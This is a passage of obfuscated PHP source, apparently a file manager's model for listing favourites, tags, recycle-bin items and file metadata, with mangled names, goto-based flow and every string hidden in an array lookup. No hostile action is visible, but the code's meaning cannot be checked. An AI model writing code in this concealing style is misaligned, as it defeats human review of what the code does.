$dçªØÚãÑ = false; goto EïºÉ¡Î¥™; f Âå½Ë­õ: $DÅÅİñ¨Ì• = array_field_key($DÅÅİñ¨Ì•, $BâäÒ‘ø); return $DÅÅİñ¨Ì•; goto f®øŠ²§ˆì; cÉñ±³”›Œ: if ($DÅÅİñ¨Ì•[$BØÌ‚÷¥[405]] != 1) { $DÅÅİñ¨Ì•[$BØÌ‚÷¥[168]] = $DÅÅİñ¨Ì•[$BØÌ‚÷¥[407]]; unset($DÅÅİñ¨Ì•[$BØÌ‚÷¥[407]]); } $BâäÒ‘ø = $dÀ¤£Ú; if (isset($DÅÅİñ¨Ì•[$BØÌ‚÷¥[408]]) && $DÅÅİñ¨Ì•[$BØÌ‚÷¥[408]][$BØÌ‚÷¥[409]] == -1) { $BâäÒ‘ø = $dçªØÚãÑ; } goto f Âå½Ë­õ; e‡¨ßİôÕ: $DÅÅİñ¨Ì•[$BØÌ‚÷¥[76]] = $BØÌ‚÷¥[403] . $DÅÅİñ¨Ì•[$BØÌ‚÷¥[397]] . $BØÌ‚÷¥[404]; $DÅÅİñ¨Ì•[$BØÌ‚÷¥[29]] = $DÅÅİñ¨Ì•[$BØÌ‚÷¥[405]] == 1 ? $BØÌ‚÷¥[77] : $BØÌ‚÷¥[193]; $DÅÅİñ¨Ì•[$BØÌ‚÷¥[406]] = $this->typeName($DÅÅİñ¨Ì•[$BØÌ‚÷¥[406]]); goto cÉñ±³”›Œ; f®øŠ²§ˆì: } public function listUserFav() { goto aÙÊÃÜŠ; E‘ÀÒåŠó: foreach ($BŠ˜´×‘ªö as &$AÀÃ¼óÏ­) { $AÀÃ¼óÏ­ = array($eŸªÆ‹¥İÛ[414] => $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[395]], $eŸªÆ‹¥İÛ[415] => $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[28]], $eŸªÆ‹¥İÛ[416] => $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[76]], $eŸªÆ‹¥İÛ[417] => $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[29]], $eŸªÆ‹¥İÛ[418] => $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[194]], $eŸªÆ‹¥İÛ[419] => $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[84]]); if ($AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[29]] == $eŸªÆ‹¥İÛ[411] && $Cé¨øµÏÕø[$AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[76]]]) { $AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[85]] = $Cé¨øµÏÕø[$AÀÃ¼óÏ­[$eŸªÆ‹¥İÛ[76]]]; } } unset($AÀÃ¼óÏ­); return $BŠ˜´×‘ªö; goto EÇ‚±¬“ÕÜ; F²¢¹…âİØ: $cÊÚáÄ¹äØ = array_to_keyvalue($cÊÚáÄ¹äØ, $eŸªÆ‹¥İÛ[33], $eŸªÆ‹¥İÛ[76]); if ($cÊÚáÄ¹äØ) { $Cé¨øµÏÕø = $this->listSource(array($eŸªÆ‹¥İÛ[412] => array($eŸªÆ‹¥İÛ[413], $cÊÚáÄ¹äØ))); } $Cé¨øµÏÕø = array_to_keyvalue($Cé¨øµÏÕø[$eŸªÆ‹¥İÛ[367]], $eŸªÆ‹¥İÛ[397]); goto E‘ÀÒåŠó; aÙÊÃÜŠ: $eŸªÆ‹¥İÛ =& $_SERVER[Ö‘Øù]; $BŠ˜´×‘ªö = Model($eŸªÆ‹¥İÛ[410])->listData(); $cÊÚáÄ¹äØ = array_filter_by_field($BŠ˜´×‘ªö, $eŸªÆ‹¥İÛ[29], $eŸªÆ‹¥İÛ[411]); goto F²¢¹…âİØ; EÇ‚±¬“ÕÜ: } public function listUserTag($f¹ÁÏ×±´) { goto DäÆ¨ŸÌ¿¼; DéæÉ¡¤ê: if (!$AÖÙê¤¥´á || count($Aá¿‚éÔŒ¼) == $AÖÙê¤¥´á[$fÈ×æ‚†ôÊ[364]][$fÈ×æ‚†ôÊ[365]]) { return $AÖÙê¤¥´á; } $fõ£ã˜Ê· = array(); $FÊ¥‚–Ë‹ = array_to_keyvalue($AÖÙê¤¥´á[$fÈ×æ‚†ôÊ[75]], $fÈ×æ‚†ôÊ[33], $fÈ×æ‚†ôÊ[397]); goto f·Î£–¢•; f·Î£–¢•: $bá½ìœ‚õÌ = array_to_keyvalue($AÖÙê¤¥´á[$fÈ×æ‚†ôÊ[74]], $fÈ×æ‚†ôÊ[33], $fÈ×æ‚†ôÊ[397]); $EÖ¾ªòÕ™ = array_merge($bá½ìœ‚õÌ, $FÊ¥‚–Ë‹); foreach ($Aá¿‚éÔŒ¼ as $fÛÉ×££÷†) { if (!in_array($fÛÉ×££÷†, $EÖ¾ªòÕ™)) { $fõ£ã˜Ê·[] = $fÛÉ×££÷†; } } goto B¤½áˆ¶÷Ü; DäÆ¨ŸÌ¿¼: $fÈ×æ‚†ôÊ =& $_SERVER[Ö‘Øù]; if ($f¹ÁÏ×±´ && !is_array($f¹ÁÏ×±´)) { $f¹ÁÏ×±´ = array($f¹ÁÏ×±´); } $b—Ê³Û‹ = Model($fÈ×æ‚†ôÊ[420])->listData(); goto eÕÌàå¡Œ; eÕÌàå¡Œ: $B©ƒ ³š‹ = array(); foreach ($b—Ê³Û‹ as $B¼àÉšĞ¡î) { $fÛÉ×££÷† = $B¼àÉšĞ¡î[$fÈ×æ‚†ôÊ[76]]; if (!$fÛÉ×££÷†) { continue; } if (!isset($B©ƒ ³š‹[$fÛÉ×££÷†])) { $B©ƒ ³š‹[$fÛÉ×££÷†] = array(); } $B©ƒ ³š‹[$fÛÉ×££÷†][] = $B¼àÉšĞ¡î[$fÈ×æ‚†ôÊ[421]]; } $Aá¿‚éÔŒ¼ = array(); goto dÔ‡ÛÅ—Ì¿; B¤½áˆ¶÷Ü: if ($fõ£ã˜Ê·) { Model($fÈ×æ‚†ôÊ[422])->removeBySource($fõ£ã˜Ê·); } return $AÖÙê¤¥´á; goto A²„™£†ãÃ; dÔ‡ÛÅ—Ì¿: foreach ($B©ƒ ³š‹ as $bÊù¿›…›ù => $e×ÄÙ©¹ À) { $CŒ——İè = !0; if (!$f¹ÁÏ×±´) { $Aá¿‚éÔŒ¼[] = $bÊù¿›…›ù; continue; } foreach ($f¹ÁÏ×±´ as $B¢êØì­‡) { if (!in_array($B¢êØì­‡, $e×ÄÙ©¹ À)) { $CŒ——İè = !1; break; } } if ($CŒ——İè) { $Aá¿‚éÔŒ¼[] = $bÊù¿›…›ù; } } if (!$Aá¿‚éÔŒ¼) { return array(); } $AÖÙê¤¥´á = $this->listSource(array($fÈ×æ‚†ôÊ[412] => array($fÈ×æ‚†ôÊ[413], $Aá¿‚éÔŒ¼))); goto DéæÉ¡¤ê; A²„™£†ãÃ: } public function listUserRecycle() { $BäœëÖÔïÕ =& $_SERVER[Ö‘Øù]; $FÛùˆ¹õ£Ş = Model($BäœëÖÔïÕ[423])->listData(); if (!$FÛùˆ¹õ£Ş) { return array(); } $EÒ³ï‰Œè¿ = array($BäœëÖÔïÕ[412] => array($BäœëÖÔïÕ[413], $FÛùˆ¹õ£Ş), $BäœëÖÔïÕ[424] => 1); return $this->listSource($EÒ³ï‰Œè¿); } public function listSource($E—Ó—óÊ, $FÓãµçù—º = 3000) { goto E—Ş†Ğ”à®; E—Ş†Ğ”à®: $C˜ß¬¾ùÖ‚ =& $_SERVER[Ö‘Øù]; if (!isset($E—Ó—óÊ[$C˜ß¬¾ùÖ‚[425]])) { $E—Ó—óÊ[$C˜ß¬¾ùÖ‚[425]] = 0; } $eñ‘èôÑ”ø = $C˜ß¬¾ùÖ‚[426]; goto D©…–éƒ¬; Eà‡Îº±¡®: $this->_listMake($C–ªÎÌí¿); return $C–ªÎÌí¿; goto Aª “•ƒ¼; D©…–éƒ¬: $C–ªÎÌí¿ = $this->field($eñ‘èôÑ”ø)->_makeOrder()->where($E—Ó—óÊ)->selectPage($FÓãµçù—º); $this->_listPageCheck($C–ªÎÌí¿, $eñ‘èôÑ”ø, $E—Ó—óÊ); $this->_listDataApply($C–ªÎÌí¿[$C˜ß¬¾ùÖ‚[367]]); goto Eà‡Îº±¡®; Aª “•ƒ¼: } private function _listPageCheck(&$fÛõ™˜£», $bÔéŞã÷§, $bà‚Ö‹†³) { goto c©ÌÔ—±Øµ; EÔÍ½ÀÑŞÍ: $EñÅ°‚ï õ = $D«”’àËí¾[$a¥™ê¯©ËÈ[361]] * ($D«”’àËí¾[$a¥™ê¯©ËÈ[351]] - 1) . $a¥™ê¯©ËÈ[47] . $D«”’àËí¾[$a¥™ê¯©ËÈ[361]]; $Fçˆ‰ä×ç = $this->_makeOrder(!0); $A‹ò“«†–¸ = $a¥™ê¯©ËÈ[431] . str_replace($a¥™ê¯©ËÈ[47], $a¥™ê¯©ËÈ[432], $Fçˆ‰ä×ç[0]); goto càó»–®Ì; A†Œ¸èà ö: $this->alias($a¥™ê¯©ËÈ[439])->field($bÔéŞã÷§)->limit($EñÅ°‚ï õ)->order($A‹ò“«†–¸); $dçµèã¯ãö = $this->join($aº…×Õãğ)->where($Aßó¡òğìç)->select(); if ($dçµèã¯ãö) { $fÛõ™˜£»[$a¥™ê¯©ËÈ[367]] = $dçµèã¯ãö; } goto Eª³öõ·…•; càó»–®Ì: if (strpos($A‹ò“«†–¸, $a¥™ê¯©ËÈ[436])) { $A‹ò“«†–¸ = str_replace($a¥™ê¯©ËÈ[436], $a¥™ê¯©ËÈ[437], $A‹ò“«†–¸); } else { $A‹ò“«†–¸ .= $a¥™ê¯©ËÈ[438] . $Fçˆ‰ä×ç[1]; } $Aßó¡òğìç = array(); foreach ($bà‚Ö‹†³ as $D¶˜Î†Ÿ => $B—¸âñ³¨) { $Aßó¡òğìç[$a¥™ê¯©ËÈ[431] . $D¶˜Î†Ÿ] = $B—¸âñ³¨; } goto A†Œ¸èà ö; c©ÌÔ—±Øµ: $a¥™ê¯©ËÈ =& $_SERVER[Ö‘Øù]; if (!is_array($fÛõ™˜£»[$a¥™ê¯©ËÈ[364]])) { return; } $D«”’àËí¾ = $fÛõ™˜£»[$a¥™ê¯©ËÈ[364]]; goto F„’ßÅ‡¾; DßŠË“ôˆÙ: if (!$eÎŒé®–Ûš) { http_close(); ActionCall($a¥™ê¯©ËÈ[429]); } if ($eÎŒé®–Ûš !== $a¥™ê¯©ËÈ[430]) { return; } $bÔéŞã÷§ = str_replace(array($a¥™ê¯©ËÈ[50], $a¥™ê¯©ËÈ[340], $a¥™ê¯©ËÈ[229]), $a¥™ê¯©ËÈ[33], $bÔéŞã÷§); goto dîö«­Ëƒ; F„’ßÅ‡¾: if ($D«”’àËí¾[$a¥™ê¯©ËÈ[366]] <= 1) { return; } if ($D«”’àËí¾[$a¥™ê¯©ËÈ[365]] >= 100000) { return; } $eÎŒé®–Ûš = Model($a¥™ê¯©ËÈ[427])->get($a¥™ê¯©ËÈ[428]); goto DßŠË“ôˆÙ; dîö«­Ëƒ: $bÔéŞã÷§ = $a¥™ê¯©ËÈ[431] . str_replace($a¥™ê¯©ËÈ[47], $a¥™ê¯©ËÈ[432], $bÔéŞã÷§) . $a¥™ê¯©ËÈ[433]; $aº…×Õãğ = $a¥™ê¯©ËÈ[434]; $aº…×Õãğ = $aº…×Õãğ . $a¥™ê¯©ËÈ[435]; goto EÔÍ½ÀÑŞÍ; Eª³öõ·…•: } protected function _makeOrder($bÇ×æÎ«„¹ = false) { goto Cš¯ïñêÀ; DÅÃÛ·˜˜: if ($bÇ×æÎ«„¹) { return array($D÷ßêĞ³—°, $cŞÂ½ğ¨ŒÜ[$b›í£ÑÎ›ò]); } return $this->order($D÷ßêĞ³—°); goto F­ÅÙÎ‘™é; a°®Òã«õ: $cŞÂ½ğ¨ŒÜ = array($bğãÀ„ã[443] => $bğãÀ„ã[444], $bğãÀ„ã[445] => $bğãÀ„ã[446]); $c†Ì²´Ùèä = array($bğãÀ„ã[28] => $bğãÀ„ã[28], $bğãÀ„ã[78] => $bğãÀ„ã[78], $bğãÀ„ã[168] => $bğãÀ„ã[407], $bğãÀ„ã[447] => $bğãÀ„ã[447], $bğãÀ„ã[448] => $bğãÀ„ã[449], $bğãÀ„ã[194] => $bğãÀ„ã[194], $bğãÀ„ã[84] => $bğãÀ„ã[84]); $f‚Œ¼Ôö— = Input::get($bğãÀ„ã[450], $bğãÀ„ã[7], $D”ß™Ï—“Ğ, array_keys($c†Ì²´Ùèä)); goto f‚‹ƒ»İ†; f“ã¢öù¦Ò: if ($f‚Œ¼Ôö— == $bğãÀ„ã[28]) { } $D÷ßêĞ³—° = $bğãÀ„ã[452] . $c†Ì²´Ùèä[$f‚Œ¼Ôö—] . $bğãÀ„ã[50] . $cŞÂ½ğ¨ŒÜ[$b›í£ÑÎ›ò]; $D÷ßêĞ³—° = rtrim(trim($D÷ßêĞ³—°), $bğãÀ„ã[47]); goto DÅÃÛ·˜˜; f‚‹ƒ»İ†: $b›í£ÑÎ›ò = Input::get($bğãÀ„ã[451], $bğãÀ„ã[7], $C»ö±Ì†İù, array_keys($cŞÂ½ğ¨ŒÜ)); if (!in_array($f‚Œ¼Ôö—, array_keys($c†Ì²´Ùèä))) { $f‚Œ¼Ôö— = $bğãÀ„ã[28]; } if (!in_array($b›í£ÑÎ›ò, array_keys($cŞÂ½ğ¨ŒÜ))) { $f‚Œ¼Ôö— = $bğãÀ„ã[443]; } goto f“ã¢öù¦Ò; Cš¯ïñêÀ: $bğãÀ„ã =& $_SERVER[Ö‘Øù]; $D”ß™Ï—“Ğ = Model($bğãÀ„ã[440])->get($bğãÀ„ã[441]); $C»ö±Ì†İù = Model($bğãÀ„ã[440])->get($bğãÀ„ã[442]); goto a°®Òã«õ; F­ÅÙÎ‘™é: } protected function _listDataApplyItem($D£Š§¶»¿õ, $E»×Íùä® = false) { $D¾†‘Üù— = array($D£Š§¶»¿õ); $this->_listDataApply($D¾†‘Üù—, $E»×Íùä®); return $D¾†‘Üù—[0]; } protected function _listDataApply(&$C¿‚”‘–, $FÃÙè¸¦™Ú = false) { goto cã¦Şë´é; C¦á×ÂÀƒà: $eÏŸˆï¯ßÁ = array_unique($eÏŸˆï¯ßÁ); $this->_listSourceCache($C¿‚”‘–); if (!$FÃÙè¸¦™Ú) { $this->_listAppendMeta($C¿‚”‘–, $eÏŸˆï¯ßÁ); $this->_listAppendFileMeta($C¿‚”‘–, $eÏŸˆï¯ßÁ); $this->_listAppendChildren($C¿‚”‘–, $eÏŸˆï¯ßÁ); } goto Aç…¸ğá¾; Aç…¸ğá¾: $this->_listAppendPath($C¿‚”‘–); $this->_listAppendAuth($C¿‚”‘–); $this->_listAppendSourceInfo($C¿‚”‘–, $eÏŸˆï¯ßÁ); goto c¬–¶ßÔ¨; cã¦Şë´é: $DªĞÄæ»¾Œ =& $_SERVER[Ö‘Øù]; if (!$C¿‚”‘–) { $C¿‚”‘– = array(); return; } $eÏŸˆï¯ßÁ = array_to_keyvalue($C¿‚”‘–, $DªĞÄæ»¾Œ[33], $DªĞÄæ»¾Œ[397]); goto C¦á×ÂÀƒà; c¬–¶ßÔ¨: $this->_listAppendUser($C¿‚”‘–); $this->_listFilterInfo($C¿‚”‘–, $FÃÙè¸¦™Ú); $this->_listAppendAuthSecret($C¿‚”‘–); goto a‹×ˆõ‰¨»; a‹×ˆõ‰¨»: } protected function _listSourceCache($d…ì¿¯èŸù) { $e¡¥¯†¥¿ =& $_SERVER[Ö‘Øù]; foreach ($d…ì¿¯èŸù as $DÍÆî™ ø) { self::$cacheSourceInfo[$e¡¥¯†¥¿[453] . $DÍÆî™ ø[$e¡¥¯†¥¿[397]]] = $DÍÆî™ ø; } } protected function _listFilterInfo(&$fòó’’®Å, $aŞ°èŒÒÓÃ = false) { $b ©Öïõè =& $_SERVER[Ö‘Øù]; foreach ($fòó’’®Å as &$F³áˆÏ­öÆ) { $F³áˆÏ­öÆ = $this->pathInfoFilter($F³áˆÏ­öÆ); self::$cachePathInfo[$b ©Öïõè[454] . intval($aŞ°èŒÒÓÃ) . $b ©Öïõè[455] . $F³áˆÏ­öÆ[$b ©Öïõè[397]]] = $F³áˆÏ­öÆ; } unset($F³áˆÏ­öÆ); } protected function _listMake(&$f¯¨“—Ê½Ò) { $aƒŒ™İêœÅ =& $_SERVER[Ö‘Øù]; $f¯¨“—Ê½Ò[$aƒŒ™İêœÅ[75]] = array(); $f¯¨“—Ê½Ò[$aƒŒ™İêœÅ[74]] = array(); foreach ($f¯¨“—Ê½Ò[$aƒŒ™İêœÅ[367]] as $C¥·ŠŒ×áÀ) { $eê”÷ºØ–¡ = $C¥·ŠŒ×áÀ[$aƒŒ™İêœÅ[405]] == 1 ? $aƒŒ™İêœÅ[75] : $aƒŒ™İêœÅ[74]; $f¯¨“—Ê½Ò[$eê”÷ºØ–¡][] = $C¥·ŠŒ×áÀ; } unset($f¯¨“—Ê½Ò[$aƒŒ™İêœÅ[367]]); } protected function _listAppendMeta(&$A×ÅÄ„œ›, $AÔÌ»ÒÌÂÂ) { goto fÁÀ½†Šåº; fÁÀ½†Šåº: $C¿•İ·®Àá =& $_SERVER[Ö‘Øù]; $d›îºÆÎùí = array($C¿•İ·®Àá[412] => array($C¿•İ·®Àá[413], $AÔÌ»ÒÌÂÂ)); $cŞÈºŒ¢æ— = Model($C¿•İ·®Àá[456])->field($C¿•İ·®Àá[457])->where($d›îºÆÎùí)->select(); goto DÇ‡¯õê¿ù; B‚œá¥š¨¡: foreach ($cŞÈºŒ¢æ— as $D£ºäÑå) { if (!isset($c¾ÓŒÒ£“ä[$D£ºäÑå[$C¿•İ·®Àá[397]]])) { $c¾ÓŒÒ£“ä[$D£ºäÑå[$C¿•İ·®Àá[397]]] = array(); } if (in_array($D£ºäÑå[$C¿•İ·®Àá[93]], $C“ğì¶°¨·)) { continue; } $c¾ÓŒÒ£“ä[$D£ºäÑå[$C¿•İ·®Àá[397]]][$D£ºäÑå[$C¿•İ·®Àá[93]]] = $D£ºäÑå[$C¿•İ·®Àá[372]]; } foreach ($A×ÅÄ„œ› as &$D­¯·—¦ƒÇ) { $D­¯·—¦ƒÇ[$C¿•İ·®Àá[460]] = !1; if (isset($c¾ÓŒÒ£“ä[$D­¯·—¦ƒÇ[$C¿•İ·®Àá[397]]])) { $D­¯·—¦ƒÇ[$C¿•İ·®Àá[460]] = $c¾ÓŒÒ£“ä[$D­¯·—¦ƒÇ[$C¿•İ·®Àá[397]]]; } if ($this->fileIsLock($D­¯·—¦ƒÇ) && $D­¯·—¦ƒÇ[$C¿•İ·®Àá[408]]) { $fŞ•¡—Ğø = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $D­¯·—¦ƒÇ[$C¿•İ·®Àá[408]][$C¿•İ·®Àá[409]] = AuthModel::authDisable($D­¯·—¦ƒÇ[$C¿•İ·®Àá[408]][$C¿•İ·®Àá[409]], $fŞ•¡—Ğø); $D­¯·—¦ƒÇ[$C¿•İ·®Àá[408]][$C¿•İ·®Àá[461]][$C¿•İ·®Àá[408]] = $D­¯·—¦ƒÇ[$C¿•İ·®Àá[408]][$C¿•İ·®Àá[409]]; } } unset($D­¯·—¦ƒÇ); goto e…Ô¶Ê¦×¢; DÇ‡¯õê¿ù: if (!$cŞÈºŒ¢æ—) { return; } $C“ğì¶°¨· = array($C¿•İ·®Àá[458], $C¿•İ·®Àá[459], $C¿•İ·®Àá[437]); $c¾ÓŒÒ£“ä = array(); goto B‚œá¥š¨¡; e…Ô¶Ê¦×¢: } protected function _listAppendFileMeta(&$c±çò®ĞÇ², $E§µåó©) { goto C°µåŞƒ¹“; C°µåŞƒ¹“: $b”ö‘¹ÓÃª =& $_SERVER[Ö‘Øù]; $e èôËÀÌ = array_to_keyvalue($c±çò®ĞÇ², $b”ö‘¹ÓÃª[33], $b”ö‘¹ÓÃª[462]); $e èôËÀÌ = array_filter(array_unique($e èôËÀÌ)); goto CÃù¦´„Úğ; dôÃ‘Â»ïè: $fÕÙ‹±Š¾Ø = Model($b”ö‘¹ÓÃª[465])->field($f–È»ËìÆ)->where($aâğ²òªª)->select(); $fÕÙ‹±Š¾Ø = array_to_keyvalue($fÕÙ‹±Š¾Ø, $b”ö‘¹ÓÃª[462]); $E£´‡°Ò²¡ = Model($b”ö‘¹ÓÃª[466])->field($b”ö‘¹ÓÃª[467])->where($aâğ²òªª)->select(); goto aš™™ÂŒÅÃ; A˜Ö¼âå”Û: foreach ($c±çò®ĞÇ² as &$AÊË½Õã—À) { goto fö×¤•—× ; fö×¤•—× : $f½„µ¦„ğ˜ = $AÊË½Õã—À[$b”ö‘¹ÓÃª[462]]; if (!$f½„µ¦„ğ˜ || !is_array($fÕÙ‹±Š¾Ø[$f½„µ¦„ğ˜])) { continue; } $c„”’ã–öí = $fÕÙ‹±Š¾Ø[$f½„µ¦„ğ˜]; goto Fƒ÷Ñ£”‹–; f‰©Éù‡Ì: if (isset($AÊË½Õã—À[$b”ö‘¹ÓÃª[164]][$b”ö‘¹ÓÃª[163]])) { $AÊË½Õã—À[$b”ö‘¹ÓÃª[163]] = json_decode($AÊË½Õã—À[$b”ö‘¹ÓÃª[164]][$b”ö‘¹ÓÃª[163]], !0); unset($AÊË½Õã—À[$b”ö‘¹ÓÃª[164]][$b”ö‘¹ÓÃª[163]]); } goto fåìŒ†ğ˜; Fƒ÷Ñ£”‹–: $c„”’ã–öí[$b”ö‘¹ÓÃª[78]] = $AÊË½Õã—À[$b”ö‘¹ÓÃª[78]]; $c„”’ã–öí[$b”ö‘¹ÓÃª[28]] = $AÊË½Õã—À[$b”ö‘¹ÓÃª[28]]; if (!isset(self::$cacheFileInfo[$b”ö‘¹ÓÃª[468] . $f½„µ¦„ğ˜])) { self::$cacheFileInfo[$b”ö‘¹ÓÃª[468] . $f½„µ¦„ğ˜] = array_merge(array(), $c„”’ã–öí); } goto a‰œ¢İ¦÷Ó; a‰œ¢İ¦÷Ó: unset($fÕÙ‹±Š¾Ø[$f½„µ¦„ğ˜][$b”ö‘¹ÓÃª[76]]); $CğÇàäˆË = is_array($d¬òŠ­Ÿ•[$f½„µ¦„ğ˜]) ? $d¬òŠ­Ÿ•[$f½„µ¦„ğ˜] : array(); $AÊË½Õã—À[$b”ö‘¹ÓÃª[164]] = array_merge($CğÇàäˆË, $fÕÙ‹±Š¾Ø[$f½„µ¦„ğ˜]); goto f‰©Éù‡Ì; fåìŒ†ğ˜: } unset($AÊË½Õã—À); goto Aõ ¾âí; CÃù¦´„Úğ: if (!$e èôËÀÌ) { return; } $aâğ²òªª = array($b”ö‘¹ÓÃª[463] => array($b”ö‘¹ÓÃª[413], $e èôËÀÌ)); $f–È»ËìÆ = $b”ö‘¹ÓÃª[464]; goto dôÃ‘Â»ïè; aš™™ÂŒÅÃ: $E£´‡°Ò²¡ = $E£´‡°Ò²¡ ? $E£´‡°Ò²¡ : array(); $d¬òŠ­Ÿ• = array(); foreach ($E£´‡°Ò²¡ as $fèñç‘›»Ä) { if (!isset($d¬òŠ­Ÿ•[$fèñç‘›»Ä[$b”ö‘¹ÓÃª[462]]])) { $d¬òŠ­Ÿ•[$fèñç‘›»Ä[$b”ö‘¹ÓÃª[462]]] = array(); } $d¬òŠ­Ÿ•[$fèñç‘›»Ä[$b”ö‘¹ÓÃª[462]]][$fèñç‘›»Ä[$b”ö‘¹ÓÃª[93]]] = $fèñç‘›»Ä[$b”ö‘¹ÓÃª[372]]; } goto A˜Ö¼âå”Û; Aõ ¾âí: } protected function _listAppendSourceInfo(&$DÜ³Ğ¾Ê, $A¸È¯Ğ) { goto b¡ù—¿í÷á; eÚÒ¿¸Şòˆ: return $DÜ³Ğ¾Ê; goto D…½¡ÖºË¾; dŸŞ†ŠÆ: $eÜ…Ã«ÔÇ = Model($aéŞÅ½¢Ô[420])->listData(); $B÷…¡­øê§ = Model($aéŞÅ½¢Ô[410])->listData(); $DØ‡»ŒªÚÕ = Model($aéŞÅ½¢Ô[471])->listSimple(); goto B¼°ÆÂÄÑ; B¼°ÆÂÄÑ: $a À•‰‹âÕ = array_to_keyvalue($BÂ‘„¢â, $aéŞÅ½¢Ô[395]); $F—ğì„‰™ = array_to_keyvalue_group($eÜ…Ã«ÔÇ, $aéŞÅ½¢Ô[76], $aéŞÅ½¢Ô[421]); $dÒ²„ßØ–„ = array_to_keyvalue($B÷…¡­øê§, $aéŞÅ½¢Ô[76]); goto FÔ·òİš¢‘; FÔ·òİš¢‘: $aƒâêôİ = array_to_keyvalue_group($DØ‡»ŒªÚÕ, $aéŞÅ½¢Ô[397]); foreach ($DÜ³Ğ¾Ê as &$e£Œ‡ƒ„«Ã) { $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]] = array($aéŞÅ½¢Ô[472] => 0, $aéŞÅ½¢Ô[473] => 0, $aéŞÅ½¢Ô[474] => 0); if (isset($dÒ²„ßØ–„[$e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[397]]])) { $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]][$aéŞÅ½¢Ô[475]] = 1; $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]][$aéŞÅ½¢Ô[476]] = $dÒ²„ßØ–„[$e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[397]]][$aéŞÅ½¢Ô[28]]; } if (isset($F—ğì„‰™[$e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[397]]])) { $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]][$aéŞÅ½¢Ô[477]] = array(); foreach ($F—ğì„‰™[$e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[397]]] as $C­¬¶êÌ´õ) { $aï”Üí¡ß = $a À•‰‹âÕ[$C­¬¶êÌ´õ]; $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]][$aéŞÅ½¢Ô[477]][] = array($aéŞÅ½¢Ô[478] => $aï”Üí¡ß[$aéŞÅ½¢Ô[395]], $aéŞÅ½¢Ô[415] => $aï”Üí¡ß[$aéŞÅ½¢Ô[28]], $aéŞÅ½¢Ô[479] => $aï”Üí¡ß[$aéŞÅ½¢Ô[480]]); } } if (isset($aƒâêôİ[$e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[397]]])) { $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]][$aéŞÅ½¢Ô[481]] = array(); foreach ($aƒâêôİ[$e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[397]]] as $fÀ•“í¢ñÉ) { $e£Œ‡ƒ„«Ã[$aéŞÅ½¢Ô[85]][$aéŞÅ½¢Ô[481]] = array($aéŞÅ½¢Ô[482] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[483]], $aéŞÅ½¢Ô[484] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[485]], $aéŞÅ½¢Ô[486] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[397]], $aéŞÅ½¢Ô[487] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[488]], $aéŞÅ½¢Ô[489] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[490]], $aéŞÅ½¢Ô[491] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[491]], $aéŞÅ½¢Ô[492] => $fÀ•“í¢ñÉ[$aéŞÅ½¢Ô[492]]); } } } unset($e£Œ‡ƒ„«Ã); goto eÚÒ¿¸Şòˆ; b¡ù—¿í÷á: $aéŞÅ½¢Ô =& $_SERVER[Ö‘Øù]; if (!defined($aéŞÅ½¢Ô[469])) { return; } $BÂ‘„¢â = Model($aéŞÅ½¢Ô[470])->listData(); goto dŸŞ†ŠÆ; D…½¡ÖºË¾: } protected function _listAppendChildren(&$b²ã‚ï­ï¤, $EÁÁ¤äÂÏ¡) { goto F•³©«á“ø; eµ•Â«²‘: $F¦ö™‚ŸÊŒ = array($D“ùËƒø[493] => array($D“ùËƒø[7], $aö…·Ç‡‰ì)); $A¯ğ‡‚¾ÉÏ = array($D“ùËƒø[493], $D“ùËƒø[405], $D“ùËƒø[494] => $D“ùËƒø[495]); $BóÎ©¹ÎŠ± = $this->field($A¯ğ‡‚¾ÉÏ)->where($F¦ö™‚ŸÊŒ)->group($D“ùËƒø[496])->select(); goto e¤Æ“º­ò¹; F•³©«á“ø: $D“ùËƒø =& $_SERVER[Ö‘Øù]; $aö…·Ç‡‰ì = array(); $A—Â•ê¬Ş = array($D“ùËƒø[203] => 0, $D“ùËƒø[204] => 0); goto BÆ¬Ä¨ ¨”; e¤Æ“º­ò¹: $fÊºÅë‰‘ = array(); foreach ($BóÎ©¹ÎŠ± as $FŞñÅä‘…¶) { $a×²Ô²ºãŞ = $FŞñÅä‘…¶[$D“ùËƒø[493]]; $a‹Å™ÄË = $FŞñÅä‘…¶[$D“ùËƒø[405]] == $D“ùËƒø[87] ? $D“ùËƒø[204] : $D“ùËƒø[203]; if (!isset($fÊºÅë‰‘[$a×²Ô²ºãŞ])) { $fÊºÅë‰‘[$a×²Ô²ºãŞ] = array($D“ùËƒø[203] => 0, $D“ùËƒø[204] => 0); } $fÊºÅë‰‘[$a×²Ô²ºãŞ][$a‹Å™ÄË] += $FŞñÅä‘…¶[$D“ùËƒø[495]]; } foreach ($b²ã‚ï­ï¤ as &$aï÷ƒ) { if (!$aï÷ƒ[$D“ùËƒø[405]]) { continue; } $B±µˆØÎ¿· = is_array($fÊºÅë‰‘[$aï÷ƒ[$D“ùËƒø[397]]]) ? $fÊºÅë‰‘[$aï÷ƒ[$D“ùËƒø[397]]] : $A—Â•ê¬Ş; $aï÷ƒ[$D“ùËƒø[204]] = $B±µˆØÎ¿·[$D“ùËƒø[204]]; 